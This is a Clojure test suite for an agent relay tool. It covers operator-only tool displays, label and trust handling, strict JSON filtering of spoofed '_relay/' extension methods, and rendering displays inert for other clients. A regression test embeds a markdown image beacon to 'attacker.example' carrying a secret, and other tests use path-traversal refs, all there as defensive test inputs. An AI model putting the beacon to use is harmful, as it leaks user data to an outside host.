(ns relay.display-test
  "What the operator is shown and the model never reads: displays from
  tool results kept as docs under shown/, the wake's notification, and the
  workspace pane's extension methods in relay acp, with the real
  agentloop binary against the stand-in for the Anthropic API."
  (:require [babashka.fs :as fs]
            [babashka.process :as p]
            [cheshire.core :as json]
            [clojure.string :as str]
            [clojure.test :refer [deftest is testing]]
            [clojure.test.check :as tc]
            [clojure.test.check.generators :as gen]
            [clojure.test.check.properties :as prop]
            [relay.acp :as acp]
            [relay.acp-client :as client]
            [relay.core :as core]
            [relay.dispatch :as dispatch]
            [relay.harness.agentloop :as agentloop]
            [relay.inbound :as inbound]
            [relay.log :as log]
            [relay.mock-anthropic :as mock]
            [relay.test-support :as support]
            [relay.tools :as tools]
            [relay.workspace :as workspace])
  (:import (java.time Instant ZoneId)))

(def now (Instant/parse "2026-10-18T12:00:00Z"))
(def fixture (str (fs/absolutize "test/fixtures/envelope-tool")))

(defn- check [n property]
  (let [result (tc/quick-check n property)]
    (is (:pass? result) (pr-str (select-keys result [:seed :shrunk :fail])))))

;; --- pure parts

(deftest a-display-ref-names-one-doc-under-shown
  (is (= "shown/2026-10-18/toolu_01abc.md" (core/shown-ref-path "shown:2026-10-18/toolu_01abc")))
  (doseq [bad ["shown:2026-10-18/../x" "shown:2026-10-18/A" "doc:2026-10-18/x" "shown:x/y" "shown:2026-10-18/"
               "shown:2026-10-18/x/y" nil 5]]
    (is (nil? (core/shown-ref-path bad)) (pr-str bad)))
  (is (= "shown:2026-10-18/" (core/shown-ref-prefix now (ZoneId/of "UTC"))))
  (is (= "shown:2026-10-19/" (core/shown-ref-prefix now (ZoneId/of "Pacific/Auckland")))
      "the date is the operator's"))

(deftest a-shown-doc-holds-the-title-body-and-sources
  (is (= "# Venues\n\nThree of them.\n\n## Sources\n\n- List [[web:https://example.org/]]\n"
         (core/shown-doc-text {:title " Venues " :body "Three of them.\n"
                               :sources [{:title "List" :ref "web:https://example.org/"}]})))
  (is (= "# T\n\nB\n" (core/shown-doc-text {:title "T" :body "B" :sources []})))
  (testing "a source ref with brackets is escaped, so it stays one ref (Codex review)"
    (is (str/includes? (core/shown-doc-text {:title "T" :body "B"
                                             :sources [{:title "S" :ref "web:https://e.org/s?f[t]=1&p=%5B"}]})
                       "- S [[web:https://e.org/s?f%5Bt%5D=1&p=%255B]]"))))

(defn- entry-line [call display]
  (json/generate-string {:seq 3 :type "tool_result"
                         :tool_result {:result {:call_id call :content "c"} :display display}}))

(deftest reading-displays-back-from-a-session
  (let [d {:title "T" :body "B" :labels ["contaminated"] :sources [{:title "S" :ref "web:x"}]
           :ref "shown:2026-10-18/c1"}
        text (str/join "\n" [(entry-line "c1" d)
                             "not json"
                             (entry-line "c2" (dissoc d :ref))
                             (entry-line "c3" (assoc d :labels ["secret"]))
                             (json/generate-string {:type "message" :display d})])]
    (is (= [{:call "c1" :ref "shown:2026-10-18/c1" :title "T" :body "B" :labels ["contaminated"]
             :sources [{:title "S" :ref "web:x"}]}]
           (agentloop/parse-displays text))
        "only well formed displays with a ref, from tool_result entries")))

(def gen-text (gen/fmap str/join (gen/vector (gen/elements ["a" " " "\n" "[[" "]]" "é" "‮" "#"]) 0 30)))

(def parse-displays-is-total
  (prop/for-all [lines (gen/vector (gen/one-of [gen/string (gen/fmap #(entry-line "c" {:title % :body % :labels [] :ref %})
                                                                    gen-text)])
                                   0 6)]
    (vector? (agentloop/parse-displays (str/join "\n" lines)))))

(deftest parse-displays-never-throws
  (check 200 parse-displays-is-total))

(defn- world []
  (let [dir (str (fs/create-temp-dir {:prefix "relay-display"}))
        data (str dir "/data")]
    (log/init! data)
    (spit (str data "/relay.edn")
          (pr-str {:timezone "UTC" :default-harness :a
                   :harnesses {:a {:kind :agentloop :api-key-command ["true"] :bin "/nonexistent"}}
                   :notify {:kind :none}}))
    (let [sys (inbound/system data)]
      (inbound/submit! sys {:type :role/add :actor "operator" :args {:id "clerk" :title "C" :instructions "x"}})
      [dir sys])))

(defn- show! [sys & {:as args}]
  (inbound/submit! sys {:type :display/show :actor "clerk" :labels (or (:labels args) ["contaminated"])
                        :args (merge {:ref "shown:2026-10-18/c1" :title "T" :body "B" :sources [] :call "c1"}
                                     (dissoc args :labels))}))

(deftest a-display-is-kept-as-the-role-with-its-labels
  (let [[dir sys] (world)]
    (try
      (show! sys)
      (let [state (inbound/current-state sys)
            v (core/doc-version state "shown/2026-10-18/c1.md" {})]
        (is (= ["clerk" ["contaminated"] "# T\n\nB\n"] ((juxt :actor :labels :content) v)))
        (is (= {:call "c1" :title "T" :sources []} (:shown v))))
      (testing "the same display again changes nothing"
        (is (empty? (show! sys))))
      (testing "another display at its path is refused"
        (is (thrown-with-msg? Exception #"holds another display" (show! sys :body "other"))))
      (testing "nobody else writes under shown/"
        (doseq [actor ["clerk" "operator"]]
          (is (thrown-with-msg? Exception #"Docs under shown/"
                                (inbound/submit! sys {:type :doc/put :actor actor :labels []
                                                      :args {:path "shown/2026-10-18/c2.md" :content "fake"}})))))
      (testing "the operator does not show things"
        (is (thrown? Exception (inbound/submit! sys {:type :display/show :actor "operator" :labels []
                                                     :args {:ref "shown:2026-10-18/c9" :title "T" :body "B"
                                                            :sources []}}))))
      (testing "a source whose ref has brackets is kept (Codex review)"
        (is (seq (show! sys :ref "shown:2026-10-18/c7" :call "c7"
                        :sources [{:title "Search" :ref "web:https://example.org/search?filters[topic]=safety"}]))))
      (testing "a role cannot remove what the operator was shown (Codex review)"
        (is (thrown-with-msg? Exception #"stay there"
                              (inbound/submit! sys {:type :doc/remove :actor "clerk" :labels []
                                                    :args {:path "shown/2026-10-18/c1.md"}}))))
      (testing "a ref that is not a shown ref is refused"
        (is (thrown? Exception (show! sys :ref "shown:2026-10-18/../../etc"))))
      (finally (fs/delete-tree dir)))))

(deftest an-envelope-tool-s-display-is-checked
  (let [[dir sys] (world)]
    (try
      (spit (str (:data-dir sys) "/relay.edn")
            (pr-str {:timezone "UTC" :default-harness :a
                     :harnesses {:a {:kind :agentloop :api-key-command ["true"] :bin "/nonexistent"}}
                     :notify {:kind :none}
                     :tools (into {} (for [m ["display" "baddisplay"]]
                                       [m {:class :read :labels ["private"] :protocol :envelope :description "d"
                                           :command [fixture m] :parameters {:type "object"}}]))
                     :grants {"clerk" {:tools ["display" "baddisplay"]}}}))
      (let [sys (inbound/system (:data-dir sys))
            {:keys [ok display]} (tools/call! sys "clerk" "display" {} [] "c1")]
        (is (= "Three venues." ok))
        (is (= ["contaminated" "private"] (:labels display)) "it carries the tool's own labels too")
        (is (= "The tool baddisplay failed." (:error (tools/call! sys "clerk" "baddisplay" {} [] "c2")))
            "a display with a field of its own is no envelope"))
      (finally (fs/delete-tree dir)))))

(deftest the-pane-s-items-and-trust
  (let [[dir sys] (world)]
    (try
      (show! sys)
      (let [conv (-> workspace/conversation
                     (workspace/shown "s1" [{:call "c1" :ref "shown:2026-10-18/c1" :path "shown/2026-10-18/c1.md"}])
                     (workspace/asked {:session "s1" :call "c2" :tool "post" :input {"a" 1} :labels ["private"]
                                       :preview "It posts a."}
                                      (Instant/parse "2099-01-01T00:00:00Z")))
            state (inbound/current-state sys)
            {[proposal shown] "items"} (workspace/items state conv "s1" true)]
        (is (= ["proposal" "waiting" "It posts a."] (map proposal ["kind" "status" "preview"])) "newest first")
        (is (= ["shown" "T" "# T\n\nB\n" ["contaminated"] true "relay trust doc shown/2026-10-18/c1.md"]
               (map shown ["kind" "title" "text" "labels" "canTrust" "trustCommand"])))
        (is (= [] (get (workspace/items state conv "other" true) "items")) "another session's are not listed")
        (is (false? (get-in (workspace/items state conv "s1" false) ["items" 1 "canTrust"]))
            "without approvals the pane shows the command instead")
        (is (= "rejected" (get-in (workspace/answered conv {:session "s1" :call "c2"} "reject_once")
                                  [:proposals ["s1" "c2"] :status])))
        (testing "trust"
          (let [params {"sessionId" "s1" "path" "shown/2026-10-18/c1.md"
                        "version" (get shown "version") "sha256" (get shown "sha256")}]
            (is (re-find #"relay trust doc" (:error (workspace/trust-command conv false params))))
            (is (re-find #"Only something this conversation showed"
                         (:error (workspace/trust-command conv true (assoc params "path" "notes/a.md")))))
            (is (re-find #"Only something"
                         (:error (workspace/trust-command conv true (assoc params "sessionId" "s2")))))
            (testing "a digest of something else trusts nothing"
              (is (thrown-with-msg? Exception #"changed since you read it"
                                    (inbound/submit! sys (:command (workspace/trust-command conv true (assoc params "sha256" "00")))))))
            (inbound/submit! sys (:command (workspace/trust-command conv true params)))
            (let [state (inbound/current-state sys)]
              (is (= [] (:labels (core/trusted-version state "doc" "shown/2026-10-18/c1.md"))))
              (is (= "chat" (:via (:data (last (filter #(= "label/trusted" (:type %)) (log/read-events (:data-dir sys)))))))
                  "the log says the trust came from the chat")))))
      (finally (fs/delete-tree dir)))))

(deftest extension-requests-are-relays-own
  (is (= {:id 3 :method "_relay/items" :params {"sessionId" "s"}}
         (workspace/extension-request (json/generate-string {:jsonrpc "2.0" :id 3 :method "_relay/items"
                                                             :params {:sessionId "s"}}))))
  (is (= {:id nil :method "_relay/x" :params {}}
         (workspace/extension-request "{\"jsonrpc\":\"2.0\",\"method\":\"_relay/x\"}")))
  (doseq [line ["{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"session/prompt\",\"params\":{\"x\":\"_relay/items\"}}"
                "{\"jsonrpc\":\"2.0\",\"id\":1,\"result\":{\"m\":\"_relay/items\"}}" nil]]
    (is (nil? (workspace/extension-request line)) line))
  ;; Not JSON: never passed on, and nothing to answer.
  (doseq [line ["nope" "nope _relay/" ""]]
    (is (= {:id nil :refused "relay does not pass on a line that is not one strictly valid JSON object."}
           (workspace/extension-request line)) line)))

(deftest an-agent-line-with-relays-method-or-that-the-strict-reader-refuses-is-dropped
  (doseq [line ["{\"jsonrpc\":\"2.0\",\"method\":\"_relay/cards/changed\",\"params\":{}}"
                "{\"jsonrpc\":\"2.0\",\"method\":\"\\u005frelay/cards/changed\",\"params\":{}}"
                "{\"jsonrpc\":\"2.0\",\"method\":\"_relay\\/items\",\"id\":1}"
                ;; A batch is not one message.
                "  [{\"jsonrpc\":\"2.0\",\"method\":\"session/update\"},{\"jsonrpc\":\"2.0\",\"method\":\"_relay/x\"}]"
                "[1,2]"
                ;; Past the reader's limits.
                (str "{\"jsonrpc\":\"2.0\",\"method\":\"session/update\",\"params\":"
                     (apply str (repeat 1100 "[")) (apply str (repeat 1100 "]")) "}")
                (str "{\"jsonrpc\":\"2.0\",\"method\":\"session/update\",\"params\":{\"rev\":"
                     (apply str (repeat 1100 "1")) "}}")
                ;; A name twice, at any depth.
                "{\"jsonrpc\":\"2.0\",\"method\":\"_relay/cards/changed\",\"method\":null,\"params\":{}}"
                "{\"jsonrpc\":\"2.0\",\"method\":\"session/update\",\"params\":{\"a\":1,\"a\":2}}"
                ;; Not one JSON value, or not JSON at all.
                "{\"jsonrpc\":\"2.0\",\"method\":\"session/update\"} {\"method\":\"_relay/x\"}"
                "[0" "[{\"method\":\"_relay/x\"}" "{not json _relay/" "nope" "" "   "
                "{\"jsonrpc\":\"2.0\",\"id\":1,\"result\":{}} null"]]
    (is (workspace/drop-agent-line? line) (subs line 0 (min 80 (count line)))))
  (doseq [line ["{\"jsonrpc\":\"2.0\",\"method\":\"session/update\",\"params\":{\"x\":\"_relay/items\"}}"
                "{\"jsonrpc\":\"2.0\",\"id\":1,\"result\":{\"method\":\"_relay/items\"}}"
                "  {\"jsonrpc\":\"2.0\",\"method\":\"session/update\"}\r"
                ;; Names match exactly: Method is another member, which
                ;; every component reads as unknown.
                "{\"jsonrpc\":\"2.0\",\"method\":\"session/update\",\"Method\":\"_relay/cards/changed\"}"]]
    (is (not (workspace/drop-agent-line? line)) line)))

(deftest a-client-line-the-agent-could-read-as-relays-method-never-reaches-it
  (testing "escapes spell the same method"
    (is (= {:id 1 :method "_relay/cards" :params {}}
           (workspace/extension-request "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"_relay\\/cards\",\"params\":{}}")))
    (is (= {:id 1 :method "_relay/cards/op" :params {"card" 3}}
           (workspace/extension-request "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"\\u005frelay/cards/op\",\"params\":{\"card\":3}}"))))
  (testing "a line the strict reader refuses is refused with its id"
    (doseq [line ["{\"jsonrpc\":\"2.0\",\"id\":4,\"method\":\"_relay/cards\",\"method\":\"session/prompt\"}"
                  "{\"jsonrpc\":\"2.0\",\"id\":4,\"method\":\"session/prompt\",\"meth\\u006fd\":\"_relay/x\"}"
                  "{\"jsonrpc\":\"2.0\",\"id\":4,\"method\":\"session/prompt\"} null"
                  "{\"jsonrpc\":\"2.0\",\"id\":4,\"method\":\"session/prompt\""]]
      (let [r (workspace/extension-request line)]
        (is (= 4 (:id r)) line)
        (is (string? (:refused r)) line))))
  (testing "another case is another member, so the line goes to the agent as an ordinary one"
    (doseq [line ["{\"jsonrpc\":\"2.0\",\"id\":4,\"Method\":\"_relay/cards\"}"
                  "{\"jsonrpc\":\"2.0\",\"id\":4,\"method\":\"_RELAY/cards\"}"
                  "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"session/prompt\",\"params\":{\"t\":\"a\\nb _relay/cards\"}}"
                  "{\"jsonrpc\":\"2.0\",\"id\":1,\"result\":{\"outcome\":\"x\\ty\"}}"]]
      (is (nil? (workspace/extension-request line)) line))))

(deftest the-display-session-of-an-agent-line
  (let [line (fn [meta] (json/generate-string {:jsonrpc "2.0" :method "session/update"
                                               :params {:sessionId "s1"
                                                        :update {:sessionUpdate "tool_call_update"
                                                                 :content [{:type "content"
                                                                            :content {:type "text" :text "x"
                                                                                      :_meta meta}}]}}}))]
    (is (= "s1" (acp/display-session (line {"relay/display" {:title "t"}}))))
    (is (nil? (acp/display-session (line {"relay/preview" true}))))
    (is (nil? (acp/display-session "{\"relay/display\":1}")))))

(deftest a-permission-request-carries-its-preview
  (let [req (json/generate-string {:jsonrpc "2.0" :id 9 :method "session/request_permission"
                                   :params {:sessionId "s" :options []
                                            :toolCall {:toolCallId "c" :name "post"
                                                       :content [{:type "content" :content {:type "text" :text "plain"}}
                                                                 {:type "content" :content {:type "text" :text "It posts."
                                                                                            :_meta {"relay/preview" true}}}]}}})]
    (is (= "It posts." (:preview (acp/permission-request req))))))

;; --- whole wakes and conversations

(def bin support/agentloop-bin)
(def relay-bin support/relay-bin)

(def ^:dynamic *dir* nil)
(def ^:dynamic *sys* nil)
(def ^:dynamic *mock* nil)

(defn- data [] (str *dir* "/data"))

(defn- with-world [responder f]
  (let [dir (str (fs/create-temp-dir {:prefix "relay-display-e2e"}))
        m (mock/start! responder)]
    (log/init! (str dir "/data"))
    (try
      (binding [*dir* dir *mock* m]
        (spit (str (data) "/relay.edn")
              (pr-str {:timezone "UTC" :default-harness :agentloop
                       :harnesses {:agentloop {:kind :agentloop :bin bin :base-url (:url m)
                                               :api-key-command ["echo" "sk-test-key"] :retry {:retries 0}}}
                       :tools {"venues" {:class :read :labels [] :protocol :envelope :description "Find venues."
                                         :command [fixture "display"]
                                         :parameters {:type "object" :properties {:question {:type "string"}}
                                                      :required ["question"] :additionalProperties false}}}
                       :grants {"clerk" {:tools ["venues"]}}
                       :notify {:kind :none}}))
        (binding [*sys* (inbound/system (data))]
          (inbound/submit! *sys* {:type :role/add :actor "operator"
                                  :args {:id "clerk" :title "Clerk" :instructions "Find things."}})
          (f)))
      (finally
        ((:stop m))
        (fs/delete-tree dir)))))

(defn- state [] (inbound/current-state *sys*))

(defn- asks-venues [body]
  (if (empty? (mock/last-tool-results body))
    {:tool-uses [{:name "venues" :input {:question "Where?"}}]}
    {:text "Found three."}))

(defn- shown-docs []
  (filter #(core/shown-path? (:path %)) (core/docs (state) nil)))

(deftest a-wake-keeps-its-displays-and-the-model-never-reads-them
  (if-not bin
    (println "SKIPPED: agentloop is not built; run make -C ../agentloop build")
    (with-world asks-venues
      (fn []
        (inbound/submit! *sys* {:type :memo/send :actor "operator" :args {:to "clerk" :subject "Venues?" :body "Find some."}})
        (let [result (dispatch/wake! *sys* "clerk" {})
              requests (map :body @(:requests *mock*))
              [doc :as docs] (shown-docs)]
          (is (= :ran (:result result)))
          (testing "the display is a doc under shown/, as the role, with its labels"
            (is (= 1 (count docs)) (pr-str (map :path (core/docs (state) nil))))
            (is (re-matches #"shown/\d{4}-\d{2}-\d{2}/toolu_[0-9a-z_]+\.md" (:path doc)))
            (is (= "clerk" (:actor doc)))
            (is (= ["contaminated" "private"] (:labels doc)) "the display's and the session's, which read a memo")
            (is (str/includes? (:content doc) "DISPLAY-BODY"))
            (is (str/includes? (:content doc) "[[web:https://venues.example/list]]")))
          (testing "the model got the closed answer and the ref, and nothing of the display"
            (let [sent (json/generate-string requests)
                  ref (str "[[shown:" (subs (:path doc) (count "shown/") (- (count (:path doc)) 3)) "]]")]
              (is (not (str/includes? sent "DISPLAY-BODY")))
              (is (not (str/includes? sent "exfil.example")))
              (is (not (str/includes? sent "Venues near the hall")))
              (is (= [(str "Three venues.\n\nThe operator was also shown " ref ".")]
                     (map :text (mock/last-tool-results (last requests)))))))
          (testing "the session did not become contaminated"
            (is (not (core/contaminated? (get-in (state) [:wakes (:wake result) :labels])))))
          (testing "the operator is told, by path"
            (let [n (first (filter #(= "shown" (:kind %)) (vals (:notifications (state)))))]
              (is n)
              (is (str/includes? (:body n) (str "relay doc " (:path doc))))
              (is (not (str/includes? (str (:title n) (:body n)) "DISPLAY-BODY"))))))))))

(defn- start-relay! [& extra]
  (client/start! (concat [relay-bin "acp" "clerk" "--data" (data)] extra) {:dir *dir*}))

(defn- display-update [c]
  (some (fn [u] (when (some #(get-in % ["content" "_meta" "relay/display"]) (get u "content")) u))
        (client/updates c)))

(deftest a-conversation-shows-the-pane-and-takes-trust-only-with-approvals
  (when bin
    (doseq [approvals? [true false]]
      (with-world asks-venues
        (fn []
          (let [c (apply start-relay! (when approvals? ["--approvals"]))
                sid (client/handshake! c *dir*)
                resp (client/request! c "session/prompt" (client/prompt-params sid "Find venues."))]
            (is (= "end_turn" (get-in resp ["result" "stopReason"])) (pr-str resp))
            (testing "the client gets the display as tool call content"
              (let [u (display-update c)
                    d (some #(get-in % ["content" "_meta" "relay/display"]) (get u "content"))]
                (is (= "Venues near the hall" (get d "title")) (pr-str (client/updates c)))
                (is (= ["contaminated"] (get d "labels")))))
            (let [items (get-in (client/request! c "_relay/items" {:sessionId sid}) ["result" "items"])
                  [item] items]
              (testing "_relay/items lists the shown doc, kept while the conversation runs"
                (is (= 1 (count items)) (pr-str items))
                (is (= ["shown" "Venues near the hall" ["contaminated"] approvals?]
                       (map item ["kind" "title" "labels" "canTrust"])))
                (is (str/includes? (get item "text") "DISPLAY-BODY")))
              (testing "_relay/resolve looks a ref up"
                (let [r (get (client/request! c "_relay/resolve" {:sessionId sid :ref (str "[[" (get item "ref") "]]")}) "result")]
                  (is (= ["ok" "shown"] [(get r "status") (get r "kind")]) (pr-str r)))
                (is (= "missing" (get-in (client/request! c "_relay/resolve" {:ref "[[doc:nowhere.md]]"}) ["result" "status"]))))
              (let [trust (client/request! c "_relay/trust" {:sessionId sid :path (get item "path")
                                                             :version (get item "version") :sha256 (get item "sha256")})
                    labels (:labels (core/trusted-version (state) "doc" (get item "path")))]
                (if approvals?
                  (testing "trust from the pane clears contaminated"
                    (is (= true (get-in trust ["result" "trusted"])) (pr-str trust))
                    (is (= [] labels)))
                  (testing "without approvals relay takes no trust from the client, and says what to run"
                    (is (str/includes? (get-in trust ["error" "message"]) "relay trust doc") (pr-str trust))
                    (is (= ["contaminated"] labels))))))
            (testing "an unknown method of relay's is answered as unknown, not passed on"
              (is (= -32601 (get-in (client/request! c "_relay/nope" {}) ["error" "code"]))))
            (client/close-input! c)
            (is (= 0 (client/wait! c 20000)))
            (testing "a conversation's operator saw them as they came, so no notification"
              (is (not-any? #(= "shown" (:kind %)) (vals (:notifications (state))))))))))))

(deftest relay-tool-passes-a-display-on-to-agentloop
  (let [result {:ok "x" :labels [] :display {:title "t" :body "b" :labels ["private"] :sources []}}]
    (is (= "{\"content\":\"x\",\"is_error\":false,\"labels\":[],\"display\":{\"title\":\"t\",\"body\":\"b\",\"labels\":[\"private\"],\"sources\":[]}}"
           (tools/envelope result)))
    (is (not (str/includes? (tools/envelope (assoc result :error "e" :ok nil)) "display"))
        "an error carries no display")))

;; --- the pane in relay chat, with the real acp-tui on a pseudo-terminal

(def drive-py (str (fs/absolutize "pentest/pty/drive.py")))

(deftest the-pane-in-relay-chat-shows-a-display-and-trusts-it
  (if-not (and bin support/acp-tui-bin (fs/exists? "/usr/bin/python3"))
    (println "SKIPPED: needs agentloop, ../acp-tui/bin/acp-tui with --open (relay#65) and python3")
    (with-world asks-venues
      (fn []
        (let [cfg (read-string (slurp (str (data) "/relay.edn")))
              _ (spit (str (data) "/relay.edn") (pr-str (assoc cfg :chat-client [support/acp-tui-bin])))
              transcript (str *dir* "/pty.out")
              plan {:rows 50 :cols 160 :timeout 90
                    :steps [{:wait "ready" :timeout 60}
                            {:send "Find venues.\r"}
                            {:wait "Venues near the hall" :timeout 60}
                            {:wait "untrusted" :timeout 10}
                            {:sleep 1}
                            {:send "\u0018"}
                            {:sleep 1}
                            {:send "t"}
                            {:sleep 1.5}
                            {:send "y"}
                            {:wait "(?i)trusted" :timeout 20}
                            {:sleep 1}
                            {:send "\u001b"}
                            {:send "\u001b"}
                            {:sleep 0.5}
                            {:send "\u0004"}]}
              r (p/shell {:out :string :err :string :continue true :dir *dir*}
                         "/usr/bin/python3" drive-py transcript (json/generate-string plan) "--"
                         relay-bin "chat" "clerk" "--data" (data))
              result (json/parse-string (last (str/split-lines (:out r))) true)
              [doc] (shown-docs)]
          (is (every? true? (:waits result)) (str (pr-str result) "\n" (subs (slurp transcript) 0 (min 4000 (count (slurp transcript))))))
          (testing "the shown doc was trusted from the pane"
            (is doc)
            (is (= [] (:labels (core/trusted-version (state) "doc" (:path doc)))))
            (is (some #(= "chat" (get-in % [:data :via])) (filter #(= "label/trusted" (:type %)) (log/read-events (data)))))))))))

;; --- a display's text for a client that knows nothing of displays

(defn- display-line [title body]
  (json/generate-string {:jsonrpc "2.0" :method "session/update"
                         :params {:sessionId "s" :update {:sessionUpdate "tool_call_update" :toolCallId "c"
                                                          :content [{:type "content" :content {:type "text" :text "closed answer"}}
                                                                    {:type "content" :content {:type "text" :text (str title "\n\n" body)
                                                                                               :_meta {"relay/display" {:title title :body body :labels ["contaminated"]}}}}]}}}))

(deftest a-display-reaches-other-clients-inert
  ;; Regression (cross-cutting review): the display's markdown went to any
  ;; ACP client as it was, so a client that knows nothing of displays
  ;; fetched a remote image in a reader's answer.
  (let [line (display-line "Receipt" "![receipt](https://attacker.example/pixel?secret=abc)​ ``` x")
        out (json/parse-string (acp/with-inert-displays line))
        [plain shown] (get-in out ["params" "update" "content"])
        text (get-in shown ["content" "text"])]
    (is (= "closed answer" (get-in plain ["content" "text"])) "other blocks are as they were")
    (is (str/starts-with? text "````text\n"))
    (is (not (str/includes? text "https://")))
    (is (not (str/includes? text "attacker.example")))
    (is (not (str/includes? text "​")))
    (is (= "![receipt](https://attacker.example/pixel?secret=abc)​ ``` x"
           (get-in shown ["content" "_meta" "relay/display" "body"])) "the display itself is unchanged")
    (is (nil? (acp/with-inert-displays "{\"method\":\"session/update\",\"params\":{}}")))))

(deftest inert-text-is-one-fence-with-nothing-live
  (check 200
         (prop/for-all [parts (gen/vector (gen/elements ["a" " " "\n" "`" "```" "````" "." "https://" "HTTP://"
                                                         "evil" "example.com" "​" "‮" "![x](" ")"]))]
           (let [out (acp/inert (apply str parts))
                 lines (str/split out #"\n" -1)
                 fence (subs (first lines) 0 (- (count (first lines)) 4))]
             (and (re-matches #"`{3,}" fence)
                  (= fence (last lines))
                  (not-any? #(str/starts-with? (str/triml %) fence) (butlast (rest lines)))
                  (not (re-find #"(?i)https?://" out))
                  (not (str/includes? out "example.com"))
                  (not (re-find #"[​‮]" out)))))))
